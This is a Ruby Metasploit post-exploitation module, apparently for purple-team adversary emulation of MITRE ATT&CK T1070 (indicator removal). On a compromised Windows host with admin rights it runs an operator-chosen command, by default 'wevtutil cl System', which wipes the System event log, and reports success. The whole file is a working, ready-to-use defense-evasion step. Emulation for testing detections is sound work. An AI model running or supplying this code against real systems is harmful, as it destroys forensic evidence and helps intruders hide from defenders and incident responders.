##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Indicator Removal from Tools (T1070) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion:
                        Adversaries may delete or alter generated event files on a host system, including potentially captured files such as quarantined malware. This may compromise the integrity of the security solution, causing events to go unreported, or make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1070' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("CMD", [ true, "Command to execute with CMD.", 'wevtutil cl System'])
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      fail_with(Failure::NoAccess, "The current session doesn ot have administrative rights.") unless is_admin?


      cmd = datastore['CMD']
      res = run_cmd(cmd)

      if not res.empty?
        print_status(res)
      else
        print_warning("No output recorded.")
      end

      print_good("Module T1070W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1070W execution failed.")
    end
   end
end
